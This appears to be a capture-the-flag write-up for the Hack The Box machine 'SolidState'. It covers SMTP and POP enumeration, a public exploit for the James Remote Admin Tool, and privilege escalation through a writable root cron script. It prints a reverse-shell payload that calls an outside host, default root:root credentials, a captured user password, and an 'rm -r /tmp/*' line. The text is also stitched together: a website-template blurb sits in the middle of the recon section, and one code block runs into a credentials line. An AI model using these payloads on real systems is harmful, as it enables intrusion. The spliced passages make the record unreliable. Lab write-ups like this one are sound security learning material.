# Summary
![](/assets/images/htb/solidstate/teaser.png)

Fun box where you get to break into a mail server and snoop through inboxes! Essential box for understanding mail based boxes with an interesting take on crontab privesc.

# Recon

This scan gives us a ton of information, we see pop3 and smtp which hints us towards an email based box.

As usual, run a directory brute force and subdomain brute force.

* Subdomain scan
  * `ffuf -w ~/HTB/horizontal/subdomains-top1million-110000.txt -u http://10.10.10.51 -H "Host: FUZZ.solidstate.htb" | grep -v '200'`
* Dir brute force

After a somewhat extended break from HTML5 UP (to work on a secret-ish new project --
more on that later!) I'm back with a brand new design: Solid State, a slick new multi-
pager that combines some of the ideas I've played with over at Pixelarity with an "angular"
sort of look. Hope you dig it :)

## SMTP

When it comes to testing services, a netcat connection to grab banners will usually do the trick. If you wanted to get more information, [hacktricks has tons of great ideas](https://book.hacktricks.xyz/pentesting/pentesting-smtp).
```
nc -vn 10.10.10.51 25
(UNKNOWN) [10.10.10.51] 25 (smtp) open
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Mon, 10 Jan 2022 06:59:49 -0500 (EST)
```

After doing some searching around, james smtp server seems to have a few vulnerabilities. Next to this, it seems that we can connect with telnet.

## POP Server

Great resource for getting up to speed is [the HackTricks page](https://book.hacktricks.xyz/pentesting/pentesting-pop) for pentesting POP.
```
telnet 10.10.10.51 110                                                                                                               1 тип

Connected to 10.10.10.51.
Escape character is '^]'.

OK+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
```

We can poke around once we have a user, but no further progress is made after a few minutes.
```
POP commands:
  USER uid           Log in as "uid"
  PASS password      Substitue "password" for your actual password
  STAT               List number of messages, total mailbox size
  LIST               List messages and sizes
  RETR n             Show message n
  DELE n             Mark message n for deletion
  RSET               Undo any changes
  QUIT               Logout (expunges messages if no RSET)
  TOP msg n          Show first n lines of message number msg
  CAPA               Get capabilities
```



### James Remote Admin Tool

[James remote admin tool offers an exploit](https://www.exploit-db.com/exploits/35513) that allows an attacker to run code on the box once a user logs in. I'm thinking there could be a way to trigger it with all the mail related services running on the box. For now make the payload a reverse shell and attempt to find a way to trigger it.

```
python 35513 10.10.10.51                                                                                                             1 тип
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.
```

```python
# specify payload
payload = 'sh -i >& /dev/udp/10.10.14.24/4445 0>&1'                   
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'    
pwd = 'root'     
```

Since the exploit worked, we know we can login as `root:root`

```
nc 10.10.10.51 4555                                                                                                            137 тип 1 тЪЩ

Creds! `mindy:P@55W0rd1!2@`

## Privesc

After sshing onto the box and running some simple commands to copy linpeas, and pspy, we find a crontab running a funny looking file in /opt.

![Crontab!](/assets/images/htb/solidstate/pspy.png)

A file owned by root we can write to! I echod a line into it for printing the root flag

```python
cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

os.system('cat /root/root.txt > /tmp/root.txt')
```

After waiting a minute or two `/tmp/root.txt` was created with the flag in it! pspy sure is powerful
